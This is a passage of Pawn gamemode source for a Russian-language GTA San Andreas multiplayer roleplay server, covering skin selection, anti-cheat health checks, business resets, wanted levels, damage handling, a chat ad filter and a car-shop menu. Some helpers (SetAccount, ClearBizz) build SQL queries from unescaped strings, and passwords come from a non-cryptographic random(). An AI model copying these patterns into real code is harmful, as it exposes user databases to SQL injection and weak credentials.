					mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pQuest = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
				    PlayerInfo[playerid][pCash], PlayerInfo[playerid][pQuest], PlayerInfo[playerid][pQuestP], PlayerInfo[playerid][pQuestPF], PlayerInfo[playerid][pName]);
	                mysql_function_query(DATABASE,QUERY,false,"","");
				}
				switch(zips[playerid])
				{
					case false: SetPlayerVirtualWorld(playerid, 2);
					case true: SetPlayerVirtualWorld(playerid, 1);
				}
				ClothesRound[playerid] = 0;
                PlayerInfo[playerid][pChar][0] = GetPlayerSkin(playerid);
				TogglePlayerControllable(playerid, 1);
				SetPlayerPos(playerid,221.7944,-8.4229,1002.2109);
				SetPlayerFacingAngle(playerid,273.5792);
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerInterior(playerid,5);
                CancelSelectTextDraw(playerid);
			    for(new i; i < 7; i++) TextDrawHideForPlayer(playerid, Select_Skin_TD[i]);
			    PlayerTextDrawHide(playerid, Select_Skin_PTD[playerid][0]);
			    PlayerTextDrawHide(playerid, Select_Skin_PTD[playerid][1]);
    			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pChar = '%i', pChars = '%i, %i, %i, %i, %i, %i' WHERE name = '%e'",
		    	PlayerInfo[playerid][pChar][0], GetPlayerSkin(playerid), GetPlayerSkin(playerid), GetPlayerSkin(playerid),
			    GetPlayerSkin(playerid), GetPlayerSkin(playerid), GetPlayerSkin(playerid), PlayerInfo[playerid][pName]);
	            mysql_function_query(DATABASE,QUERY,false,"","");
			}
		}
	}
	else if(_:clickedid == INVALID_TEXT_DRAW)
	{
		if(GetPVarInt(playerid, "SelectAvto") != -1) return ShowPlayerDialogEx(playerid,14011,0,"Предупреждение","Вы действительно хотите покинуть магазин?","Да","Нет");
		/*if(GetPVarInt(playerid,"Tookfaggio"))
		{
			DeletePVar(playerid,"Tookfaggio");
			for(new t; t < 5; t++) TextDrawHideForPlayer(playerid, Tookfaggio[t]);
			return CancelSelectTextDraw(playerid);
		}*/
		if(GetPVarInt(playerid,"BoneStol")) return ShowPlayerDialogEx(playerid,135,0,"Предупреждение","Если вы сделали ставку и игра уже началась, то деньги вам не вернутся!\nВы точно хотите покинуть стол?","Ок","Отмена");
	}
	return 1;
}
stock GeneratePassword(size)
{
	new
	bigletters[26][] = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"},
	smallletters[26][] = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"},
	numbers[10][] = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"},
	password[128];
	if(size > sizeof(password)) size = sizeof(password);
	for(new i = 0; i < size; i ++)
	{
		switch(random(3))
		{
		case 0: strcat(password, bigletters[random(sizeof(bigletters))]);
		case 1: strcat(password, smallletters[random(sizeof(smallletters))]);
		case 2: strcat(password, numbers[random(sizeof(numbers))]);
		}
	}
	return password;
}
publics: GETHP(playerid)
{
	GetPlayerHealth(playerid,GMHP[playerid][1]);
	GetVehicleHealth(GetPlayerVehicleID(playerid),VEHHP[playerid][1]);
	new stringer[80];
	if(!IsPlayerInAnyVehicle(playerid))
	{
		if(GMHP[playerid][1] >= 100.0)
		{
			format(stringer, sizeof(stringer), " {ff0000}[ANTI-GM]: {bbbbbb}%s[%i] использует гм/клео скрипты", PlayerInfo[playerid][pName],playerid);
			ABroadCast(COLOR_REDD,stringer,2);
			SetPlayerHealthAC(playerid, GMHP[playerid][0]);
			SetPlayerArmourAC(playerid, GMARMOUR[playerid][0]);
			return true;
		}
		else
		{
			format(stringer, sizeof(stringer), " {34c924}[ANTI-GM] {bbbbbb}%s[%i] не использует гм/клео скрипты", PlayerInfo[playerid][pName],playerid);
			ABroadCast(COLOR_YELLOW,stringer,2);
			SetPlayerHealthAC(playerid, GMHP[playerid][0]);
			SetPlayerArmourAC(playerid, GMARMOUR[playerid][0]);
			return true;
		}
	}
	else
	{
		if(VEHHP[playerid][1] >= 9999.0)
		{
			format(stringer, sizeof(stringer), " {ff0000}[ANTI-GM]: {bbbbbb}%s[%i] использует гм/клео скрипты", PlayerInfo[playerid][pName],playerid);
			ABroadCast(COLOR_REDD,stringer,2);
			SetVehicleHealth(GetPlayerVehicleID(playerid),VEHHP[playerid][0]);
			return true;
		}
		else
		{
			format(stringer, sizeof(stringer), " {34c924}[ANTI-GM] {bbbbbb}%s[%i] не использует гм/клео скрипты", PlayerInfo[playerid][pName],playerid);
			ABroadCast(COLOR_YELLOW,stringer,2);
			SetVehicleHealth(GetPlayerVehicleID(playerid),VEHHP[playerid][0]);
			return true;
		}
	}
}
stock ClearBizz(i)
{
	BizzInfo[i][bLocked] = 1;
	BizzInfo[i][bProducts] = 0;
	BizzInfo[i][bTill] = 0;
	BizzInfo[i][bPrice] = 0;
	BizzInfo[i][bMafia] = 0;
	BizzInfo[i][bLandTax] = 0;
	BizzPay[i] = 0;
	BizzInfo[i][bLockTime] = 0;
	BizzInfo[i][bLicense] = 0;
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[i][bMessage],BizzInfo[i][bBuyPrice]);
	UpdateDynamic3DTextLabelText(BizzInfo[i][bLabel], COLOR_GREEN, YCMDstr);
	if(IsPlayerConnected(GetPlayerID(BizzInfo[i][bOwner]))) PlayerInfo[GetPlayerID(BizzInfo[i][bOwner])][pBank] += BizzInfo[i][bBuyPrice] / 2, SetPVarInt(GetPlayerID(BizzInfo[i][bOwner]), "GetBizz", 1);
	else mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pBank = pBank + 50000, pText = '2' WHERE name = '%s'",BizzInfo[i][bOwner]), mysql_function_query(DATABASE,QUERY,false,"","");
	strmid(BizzInfo[i][bOwner], "None", 0, strlen("None"), 50);
	return true;
}
stock IsANope(carid)
{
	switch(GetVehicleModel(carid))
	{
	case 400,404,436,439,458,466,475,478,479,492,516,517,518,526,527,542,543,546,547,549,567: return true;
	default: return false;
	}
	return false;
}
stock IsAB(carid)
{
	switch(GetVehicleModel(carid))
	{
	case 419,421,445,489,491,533,534,554,555,561,579,580,589,603,418,461,581,586,401,405,412,422,426,467,474,496,507,529,536,540,550,551,566,575,576,585,600: return true;
	default: return false;
	}
	return false;
}
stock IsAA(carid)
{
	switch(GetVehicleModel(carid))
	{
	case 541,522,434,477,480,535,545,558,559,560,562,565,587,602,521,463,468,402,411,415,429,451,506: return true;
	default: return false;
	}
	return false;
}
publics: Ugon(playerid)
{
	nachalvzlom[playerid] = 0;
	PlayerInfo[playerid][pWantedLevel] +=1;
	PlayerInfo[playerid][pZakonp] -= 1;
	SetPlayerWantedLevel(playerid,PlayerInfo[playerid][pWantedLevel]);
	SetPlayerCriminal(playerid,"Неизвестный", "Угон автомобиля");
	SCM(playerid,COLOR_BLUE,"Замок автомобиля открыт, пора уносить ноги!");
	ClearAnimations(playerid, 1);
	UnLockCar(playerid,idcarv[playerid]);
	return 1;
}
stock Float:GetDistanceBetweenPoints(Float:X, Float:Y, Float:Z, Float:PointX, Float:PointY, Float:PointZ)
{
	new Float:Distance;Distance = floatabs(floatsub(X, PointX)) + floatabs(floatsub(Y, PointY)) + floatabs(floatsub(Z, PointZ));
	return Distance;
}
stock IsPlayerApplyAnimation(playerid, animation[])
{
	if(!GetPlayerAnimationIndex(playerid)) return 0;
	else
	{
		new animlib[64], animname[64];
		GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, sizeof(animlib), animname, sizeof(animname));
		if(!strcmp(animname, animation, true)) return 1;
	}
	return 0;
}
public OnPlayerCommandPerformed(playerid, cmdtext[], success) return false;
public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(PlayerInfo[playerid][pLogin] == 0) return 0;
	return 1;
}
stock ChosePlayerSkin(playerid)
{
	SetPlayerHealthAC(playerid,100);
	SCM(playerid, 0xBC2C2CFF, " Используйте клавишу 'Быстрый бег' (пробел по умолчанию)");
	SCM(playerid, 0xBC2C2CFF, " Используйте клавишу 'Вверх,вниз' (W,S по умолчанию)");
	if(PlayerInfo[playerid][pSex] == 1 && PlayerInfo[playerid][pTut] == 0)
	{
		new rand = 0;
		SetPlayerPos(playerid, gInviteSpawns[rand][0], gInviteSpawns[rand][1], gInviteSpawns[rand][2]);
		SetPlayerFacingAngle(playerid, gInviteSpawns[rand][3]);
        InterpolateCameraPos(playerid, 1475.5559,-1366.0914,62.4475, 1472.0436+1.0,-1369.0840,62.4495, 10000);
        InterpolateCameraLookAt(playerid, 1472.0436,-1369.0840,62.4495, 1472.0436,-1369.0840,62.4495, 10000);
		PlayerInfo[playerid][pTut] = 0;
		PlayerInfo[playerid][pChar][0] = 79;
		PlayerInfo[playerid][pModel] = 255;
		PlayerInfo[playerid][pMember] = 0;
		PlayerInfo[playerid][pLeader] = 0;
		PlayerInfo[playerid][pRank] = 1;
		SetPlayerInterior(playerid,0);
		ChosenSkin[playerid] = 79;
		TutTime[playerid] = 0;
		TogglePlayerControllable(playerid, 0);
		SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
		SelectChar[playerid] = 255;
		SelectCharPlace[playerid] = 1;
		PlayerInfo[playerid][pChar][0] = ChosenSkin[playerid];
		new skin =2 + random(100);
		SetPlayerVirtualWorld(playerid,skin);
		SetPlayerPos(playerid, gInviteSpawns[rand][0], gInviteSpawns[rand][1], gInviteSpawns[rand][2]);
		SetPlayerFacingAngle(playerid, gInviteSpawns[rand][3]);
        InterpolateCameraPos(playerid, 1475.5559,-1366.0914,62.4475, 1472.0436+1.0,-1369.0840,62.4495, 10000);
        InterpolateCameraLookAt(playerid, 1472.0436,-1369.0840,62.4495, 1472.0436,-1369.0840,62.4495, 10000);
		return true;
	}
	else if(PlayerInfo[playerid][pSex] == 2 && PlayerInfo[playerid][pTut] == 0)
	{
		new rand = 0;
		SetPlayerPos(playerid, gInviteSpawns[rand][0], gInviteSpawns[rand][1], gInviteSpawns[rand][2]);
		SetPlayerFacingAngle(playerid, gInviteSpawns[rand][3]);
        InterpolateCameraPos(playerid, 1475.5559,-1366.0914,62.4475, 1472.0436+1.0,-1369.0840,62.4495, 10000);
        InterpolateCameraLookAt(playerid, 1472.0436,-1369.0840,62.4495, 1472.0436,-1369.0840,62.4495, 10000);
		PlayerInfo[playerid][pSex] = 2;
		PlayerInfo[playerid][pTut] = 0;
		PlayerInfo[playerid][pChar][0] = 90;
		PlayerInfo[playerid][pModel] = 255;
		PlayerInfo[playerid][pMember] = 0;
		PlayerInfo[playerid][pLeader] = 0;
		PlayerInfo[playerid][pRank] = 1;
		ChosenSkin[playerid] = 90;
        SetPlayerInterior(playerid,0);
		TutTime[playerid] = 0;
		TogglePlayerControllable(playerid, 0);
		SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
		SelectChar[playerid] = 255;
		SelectCharPlace[playerid] = 1;
		PlayerInfo[playerid][pChar][0] = ChosenSkin[playerid];
		new skin =2 + random(100);
		SetPlayerVirtualWorld(playerid,skin);
		SetPlayerPos(playerid, gInviteSpawns[rand][0], gInviteSpawns[rand][1], gInviteSpawns[rand][2]);
		SetPlayerFacingAngle(playerid, gInviteSpawns[rand][3]);
        InterpolateCameraPos(playerid, 1475.5559,-1366.0914,62.4475, 1472.0436+1.0,-1369.0840,62.4495, 10000);
        InterpolateCameraLookAt(playerid, 1472.0436,-1369.0840,62.4495, 1472.0436,-1369.0840,62.4495, 10000);
		return true;
	}
	return true;
}
publics: AntiNopResetPlayerWeapon(playerid)
{
	new Guns[13][2];
	for (new i = 1; i < 13; i++)
	{
		GetPlayerWeaponData(playerid, i, Guns[i][0], Guns[i][1]);
	}
}
publics: Recognition()
{
	for(new i = 0; i < SLOTVIBROS; i++)
	{
		if(GetTickCount()-VibrosInfo[i][vTime] <= 60000*20)
		{
			DestroyDynamic3DTextLabel(VibrosInfo[i][vPodnyat]);
			DestroyObject(VibrosInfo[i][vObject]);
			for(new ix = i; ix < SLOTVIBROS-1; ix++)
			{
				VibrosInfo[ix][vModel] = VibrosInfo[ix+1][vModel];
				VibrosInfo[ix][vTime] = VibrosInfo[ix+1][vTime];
				VibrosInfo[ix][vX] = VibrosInfo[ix+1][vX];
				VibrosInfo[ix][vY] = VibrosInfo[ix+1][vY];
				VibrosInfo[ix][vZ] = VibrosInfo[ix+1][vZ];
				DestroyDynamic3DTextLabel(VibrosInfo[ix+1][vPodnyat]);
				DestroyObject(VibrosInfo[ix+1][vObject]);
				if(VibrosInfo[ix][vModel] == 1)
				{
					VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Наркотики\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
					VibrosInfo[ix][vObject] = CreateObject(1485,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
				}
				else
				{
					VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Материалы\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
					VibrosInfo[ix][vObject] = CreateObject(1210,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
				}
			}
			SLOTVIBROS--;
		}
	}
	new Float:x,Float:y,Float:z;
	foreach(i)
	{
		if(!PlayerInfo[i][pWantedLevel] || !PlayerInfo[i][pLogin]) continue;
		recognition[i] = 0;
		GetPlayerPos(i,x,y,z);
		for(new idx=0;idx<players;idx++)
		{
			if(IsPlayerInRangeOfPoint(Players[idx],150,x,y,z) && IsACop(Players[idx]) && Players[idx] != i) recognition[i]++;
		}
		if(!recognition[i])
		{
			SCM(i,-1," Ваша узнаваемость понизилась");
			PlayerInfo[i][pWantedLevel]--, SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel] );
			if(!PlayerInfo[i][pWantedLevel])
			{
				if(LabelOn[i] == 1)
				{
					LabelOn[i] = 0;
					Delete3DTextLabel(LabelRecognition[i]);
				}
				PlayerInfo[i][pRecognition] = 0;
			}
			else
			{
				if(PlayerInfo[i][pRecognition] > 0) PlayerInfo[i][pRecognition]--;
			}
		}
		else
		{
			SCM(i,-1," Ваша узнаваемость повысилась");
			if(PlayerInfo[i][pRecognition] < 3) PlayerInfo[i][pRecognition]++;
		}
	}
}
stock SetAccount(username[], stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE `accounts` SET  %s = '%i' WHERE name = '%s' LIMIT 1", stolb, znach, username);
	return mysql_function_query(DATABASE,Query,false,"","");
}
stock ClearReconnect()
{
	for(new i=0; i<MAX_PLAYERS; i++) strmid(ExitInfo[i][ExitIP],"None", 0, strlen("None"), 32), ExitInfo[i][ExitTime] = 0;
	return 1;
}
publics: SetDamage(playerid, issuerid, Float:damage, weaponid)
{
	if(GetPVarInt(playerid,"AFK_Time") > 2) return true;
	if(PlayerInfo[playerid][pArmour] > 0.0)
    {
        if((PlayerInfo[playerid][pArmour]-damage) <= 0.0)
        {
        	SetPlayerArmourAC(playerid, 0.0);
        	PlayerInfo[playerid][pArmour] = 0.0;
        }
        else if((PlayerInfo[playerid][pArmour]-damage) > 0.0)
        {
       		SetPlayerArmourAC(playerid, PlayerInfo[playerid][pArmour]-damage);
       		PlayerInfo[playerid][pArmour] -= damage;
        }
    }
    else
    {
        if((PlayerInfo[playerid][pHP]-damage) <= 0.0 && !killed[playerid])
        {
			PlayerInfo[playerid][pHP] = 0.0;
        	SetPlayerHealthAC(playerid, 0.0);
        	OnPlayerDeath(playerid, issuerid, weaponid);
        	PlayerInfo[playerid][pHP] = 100;
        	killed[playerid] = true;
        }
        else if((PlayerInfo[playerid][pHP]-damage) > 0.0)
        {
			PlayerInfo[playerid][pHP] -= damage;
           	SetPlayerHealthAC(playerid, PlayerInfo[playerid][pHP]);
        }
    }
    return true;
}
forward ac_OnPlayerGiveDamage(playerid, damagedid, amount, weaponid);
public ac_OnPlayerGiveDamage(playerid, damagedid, amount, weaponid)
{
    if(AGM[damagedid]) return false;

    if(weaponid == 24 || weaponid == 25 || weaponid == 31 || weaponid == 29 || weaponid == 33)
	{
		  if(!IsACop(playerid)) return true;
		  if(NewTazer[playerid] != true) return true;
		  if(PlayerCuffed[damagedid] == 2) return true;
	      if(PlayerCuffed[damagedid] == 1)
	      {
	   		  new Float:Health;
	  		  GetPlayerHealth(damagedid,Health);
		      return SetPlayerHealth(damagedid,Health);
		  }
		  new Float:Health;
		  GetPlayerHealth(damagedid,Health);
  		  SetPlayerHealth(damagedid,Health);
		  ApplyAnimation(damagedid,"PED","KO_skid_front",6.0,0,1,1,1,0);
		  PlayerCuffed[damagedid] = 1;
		  PlayerCuffedTime[damagedid] = 10;
		  GameTextForPlayer(damagedid,"~r~freeze", 5000, 3);
	}

	SetDamage(damagedid, playerid, amount, weaponid);
	return true;
}
forward ac_OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart);
public ac_OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
    /*if(issuerid != INVALID_PLAYER_ID)
    {
        new string[128], victim[MAX_PLAYER_NAME], attacker[MAX_PLAYER_NAME];
        new weaponname[24];
        GetPlayerName(playerid, victim, sizeof (victim));
        GetPlayerName(issuerid, attacker, sizeof (attacker));

        GetWeaponName(weaponid, weaponname, sizeof (weaponname));
        format(string, sizeof(string), " %s повредил на %.0f здоровья %s, оружие: %s", attacker, amount, victim, weaponname);
        SendClientMessageToAll(0xFFFFFFFF, string);
    }*/
    if(Convoi[playerid] != 9999)
    {
        new Float:HP;
        GetPlayerHealth(playerid,HP);
        SetPlayerHealth(playerid,HP);
    }
   	
    return true;
}
stock IsText(text[])
{
	if(strfind(text, "\\", true) != -1) return 0;
	if(strfind(text, "/", true) != -1) return 0;
	if(strfind(text, "q", true) != -1) return 1;
	if(strfind(text, "w", true) != -1) return 1;
	if(strfind(text, "e", true) != -1) return 1;
	if(strfind(text, "r", true) != -1) return 1;
	if(strfind(text, "t", true) != -1) return 1;
	if(strfind(text, "y", true) != -1) return 1;
	if(strfind(text, "u", true) != -1) return 1;
	if(strfind(text, "i", true) != -1) return 1;
	if(strfind(text, "o", true) != -1) return 1;
	if(strfind(text, "p", true) != -1) return 1;
	if(strfind(text, "a", true) != -1) return 1;
	if(strfind(text, "s", true) != -1) return 1;
	if(strfind(text, "d", true) != -1) return 1;
	if(strfind(text, "f", true) != -1) return 1;
	if(strfind(text, "g", true) != -1) return 1;
	if(strfind(text, "h", true) != -1) return 1;
	if(strfind(text, "j", true) != -1) return 1;
	if(strfind(text, "k", true) != -1) return 1;
	if(strfind(text, "l", true) != -1) return 1;
	if(strfind(text, "z", true) != -1) return 1;
	if(strfind(text, "x", true) != -1) return 1;
	if(strfind(text, "c", true) != -1) return 1;
	if(strfind(text, "v", true) != -1) return 1;
	if(strfind(text, "b", true) != -1) return 1;
	if(strfind(text, "n", true) != -1) return 1;
	if(strfind(text, "m", true) != -1) return 1;
	return 0;
}
stock ConvertSeconds(time)
{
	new str[128];
	if(time < 3600) format(str, sizeof(str), "%i", time);
	return str;
}
public OnPlayerEditAttachedObject( playerid, response, index, modelid, boneid,
Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ,
Float:fRotX, Float:fRotY, Float:fRotZ,
Float:fScaleX, Float:fScaleY, Float:fScaleZ )
{
	SetPlayerAttachedObject(GetPVarInt(playerid, "GetPlayerObject"),index,modelid,boneid,fOffsetX,fOffsetY,fOffsetZ,fRotX,fRotY,fRotZ,fScaleX,fScaleY,fScaleZ);
	SCM(playerid, -1, " Объект установлен");

	return 1;
}
stock AntiReklama(playerid,text[],test[])
{
	for(new txt; txt < strlen(text); txt++)
	{
		if(text[txt] >= '0' && text[txt] <= '9')
		{
			SetPVarInt(playerid,"Text",GetPVarInt(playerid,"Text")+1);
			if(GetPVarInt(playerid,"Text")==10)
			{
				if(PlayerInfo[playerid][pMuted] > 0)
				{
					format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
					SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
					return true;
				}
		 	 	new ip[26];
				GetPlayerIp(playerid,ip,sizeof(ip));
				format(string, 156, "%s %s: %s",Name(playerid),test,text);
				ABroadCast(COLOR_LIGHTRED,string,1);
				format(string, 156, "                    Login: %s  [ID: %i]  IP: %s",Name(playerid),playerid,ip);
				ABroadCast(COLOR_LIGHTRED,string,1);
				format(YCMDstr,sizeof(YCMDstr)," Вы получили Бан чата на 3 часа");
				SCM(playerid, COLOR_LIGHTRED, YCMDstr);
				format(YCMDstr,sizeof(YCMDstr)," Используйте ''/mm'' -> ''Администрация'' -> ''Обратная связь'', если бан был выдан по ошибке");
				SCM(playerid, COLOR_LIGHTRED, YCMDstr);
				PlayerInfo[playerid][pMuted] = 10800;
				SetPVarInt(playerid, "antireklamka", 1);
			}
		}
	}
	if(Rekl[playerid] == 1 && strfind(text,"www.",true)!=-1 || Rekl[playerid] == 1 && strfind(text,":7",true)!=-1
			|| Rekl[playerid] == 1 && strfind(text,"7777",true)!=-1 || Rekl[playerid] == 1 && strfind(text,".ru",true)!=-1
			|| Rekl[playerid] == 1 && strfind(text,".net",true)!=-1 || Rekl[playerid] == 1 && strfind(text,".com",true)!=-1
			|| Rekl[playerid] == 1 && strfind(text,".su",true)!=-1 || Rekl[playerid] == 1 && strfind(text,"77.",true)!=-1
			|| Rekl[playerid] == 1 && strfind(text,":7777",true)!=-1 || Rekl[playerid] == 1 && strfind(text,"176.",true)!=-1
			|| Rekl[playerid] == 1 && strfind(text,".ru",true)!=-1 || Rekl[playerid] == 1 && strfind(text,".RU",true)!=-1
			|| Rekl[playerid] == 1 && strfind(text,".COM",true)!=-1 || Rekl[playerid] == 1 && strfind(text,".com",true)!=-1)
	{
		if(PlayerInfo[playerid][pMuted] > 0)
		{
			format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
			SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
			return true;
		}
 		new ip[26];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string, 156, "%s %s: %s!!",Name(playerid),test,text);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(string, 156, "                    Login: %s  [ID: %i]  IP: %s",Name(playerid),playerid,ip);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(YCMDstr,sizeof(YCMDstr)," Вы получили Бан чата на 3 часа");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		format(YCMDstr,sizeof(YCMDstr)," Используйте ''/mm'' -> ''Администрация'' -> ''Обратная связь'', если бан был выдан по ошибке");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		PlayerInfo[playerid][pMuted] = 10800;
		SetPVarInt(playerid, "antireklamka", 1);
	}
	return true;
}
//AutoSalon
stock NextCar(playerid)
{
	if(PlayerInfo[playerid][SalonTime] > gettime()) return GameTextForPlayer(playerid,"Loading...",1000,3);
	SetPVarInt(playerid, "SelectAvto", GetPVarInt(playerid, "SelectAvto") +1);
	switch(GetPVarInt(playerid,"CarShop"))
	{
	case 0:if(GetPVarInt(playerid, "SelectAvto") > 19) SetPVarInt(playerid, "SelectAvto", 0);//nope
	case 1:if(GetPVarInt(playerid, "SelectAvto") > 38) SetPVarInt(playerid, "SelectAvto", 20);//c
	case 2:if(GetPVarInt(playerid, "SelectAvto") > 56) SetPVarInt(playerid, "SelectAvto", 39);//d
	case 3:if(GetPVarInt(playerid, "SelectAvto") > 85) SetPVarInt(playerid, "SelectAvto", 72);//a
	case 4:if(GetPVarInt(playerid, "SelectAvto") > 71) SetPVarInt(playerid, "SelectAvto", 57);//b
	}
	return ShowingCar(playerid);
}
stock BackCar(playerid)
{
	if(PlayerInfo[playerid][SalonTime] > gettime()) return GameTextForPlayer(playerid,"Loading...",1000,3);
	SetPVarInt(playerid, "SelectAvto", GetPVarInt(playerid, "SelectAvto")-1);
	switch(GetPVarInt(playerid,"CarShop"))
	{
	case 0:if(GetPVarInt(playerid, "SelectAvto") < 0) SetPVarInt(playerid, "SelectAvto", 19);//nope
	case 1:if(GetPVarInt(playerid, "SelectAvto") < 20) SetPVarInt(playerid, "SelectAvto", 38);//c
	case 2:if(GetPVarInt(playerid, "SelectAvto") < 39) SetPVarInt(playerid, "SelectAvto", 56);//d
	case 3:if(GetPVarInt(playerid, "SelectAvto") < 72) SetPVarInt(playerid, "SelectAvto", 85);//a
	case 4:if(GetPVarInt(playerid, "SelectAvto") < 57) SetPVarInt(playerid, "SelectAvto", 71);//b
	}
	return ShowingCar(playerid);
}
stock ShowingCar(playerid)
{
	if(PlayerInfo[playerid][SalonCar] != INVALID_VEHICLE_ID) DestroyVehicle(PlayerInfo[playerid][SalonCar]);
	PlayerInfo[playerid][SalonCar] = CreateVehicle(ShopCar[GetPVarInt(playerid, "SelectAvto")][0],-1658.7123,1212.8981,20.9499,285.2443,1,1,-1);
	SetPVarInt(playerid, "Nokick",1);
	SetVehicleParamsEx(PlayerInfo[playerid][SalonCar],false,false,false,false,false,false,false);
	CarHealth[PlayerInfo[playerid][SalonCar]] = float(1000);
	SetVehicleVirtualWorld(PlayerInfo[playerid][SalonCar], playerid+1);
	PutPlayerInVehicle(playerid,PlayerInfo[playerid][SalonCar],0);
	SetPlayerCameraPos(playerid,-1654.097045,1218.596679,22.708799);
	SetPlayerCameraLookAt(playerid,-1659.106201,1210.380737,19.987318);
	SetPVarInt(playerid,"BuyColor",0);
	SetPVarInt(playerid,"BuyColor1",0);
	switch(booston)
	{
	case 0:
		{
			format(string,128,"~n~~n~~n~~n~~n~~n~~n~~n~~b~NAME: ~w~%s~n~~g~COST: ~w~%i~n~~y~COLOR1: ~w~-1 ~y~COLOR2: ~w~-1",VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400],ShopCar[GetPVarInt(playerid, "SelectAvto")][1]);
		}
	case 1:
		{
			format(string,128,"~n~~n~~n~~n~~n~~n~~n~~n~~b~NAME: ~w~%s~n~~g~COST: ~w~%i~n~~y~COLOR1: ~w~-1 ~y~COLOR2: ~w~-1",VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400],ShopCar[GetPVarInt(playerid, "SelectAvto")][1]-ShopCar[GetPVarInt(playerid, "SelectAvto")][1]*20/100);
		}
	}
	GameTextForPlayer(playerid,string, 5000, 3);
	if(booston == 0) format(string,128,"Model: %s~n~Cost: %i",VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400],ShopCar[GetPVarInt(playerid, "SelectAvto")][1]);
	else if(booston == 1) format(string,128,"Model: %s~n~Cost: %i",VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400],ShopCar[GetPVarInt(playerid, "SelectAvto")][1]-ShopCar[GetPVarInt(playerid, "SelectAvto")][1]*20/100);
	PlayerTextDrawSetString(playerid,ShopText[playerid],string);
	PlayerInfo[playerid][SalonTime] = gettime()+1;
	return 1;
}

stock NextColor(playerid,whocolor)
{
	if(whocolor == 0)
	{
		SetPVarInt(playerid,"BuyColor",GetPVarInt(playerid,"BuyColor")+1);
		if(GetPVarInt(playerid,"BuyColor") > 125) SetPVarInt(playerid,"BuyColor",0);
	}
	else
	{
		SetPVarInt(playerid,"BuyColor1",GetPVarInt(playerid,"BuyColor1")+1);
		if(GetPVarInt(playerid,"BuyColor1") > 125) SetPVarInt(playerid,"BuyColor1",0);
	}
	ChangeVehicleColor(GetPlayerVehicleID(playerid),GetPVarInt(playerid,"BuyColor"),GetPVarInt(playerid,"BuyColor1"));
	if(booston == 0) format(string,128,"~n~~n~~n~~n~~n~~n~~n~~n~~b~NAME: ~w~%s~n~~g~COST: ~w~%i~n~~y~COLOR1: ~w~%i ~y~COLOR2: ~w~%i",VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400],ShopCar[GetPVarInt(playerid, "SelectAvto")][1],GetPVarInt(playerid,"BuyColor"),GetPVarInt(playerid,"BuyColor1"));
	else if(booston == 1) format(string,128,"~n~~n~~n~~n~~n~~n~~n~~n~~b~NAME: ~w~%s~n~~g~COST: ~w~%i~n~~y~COLOR1: ~w~%i ~y~COLOR2: ~w~%i",VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400],ShopCar[GetPVarInt(playerid, "SelectAvto")][1]-ShopCar[GetPVarInt(playerid, "SelectAvto")][1]*20/100,GetPVarInt(playerid,"BuyColor"),GetPVarInt(playerid,"BuyColor1"));
	GameTextForPlayer(playerid,string, 5000, 3);
	return 1;
}
stock BackColor(playerid,whocolor)
{
	if(whocolor == 0)
	{
		SetPVarInt(playerid,"BuyColor",GetPVarInt(playerid,"BuyColor")-1);
		if(GetPVarInt(playerid,"BuyColor") < 0) SetPVarInt(playerid,"BuyColor",125);
	}
	else
	{
		SetPVarInt(playerid,"BuyColor1",GetPVarInt(playerid,"BuyColor1")-1);
		if(GetPVarInt(playerid,"BuyColor1") < 0) SetPVarInt(playerid,"BuyColor1",125);
	}
	ChangeVehicleColor(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"BuyColor"),GetPVarInt(playerid,"BuyColor1"));
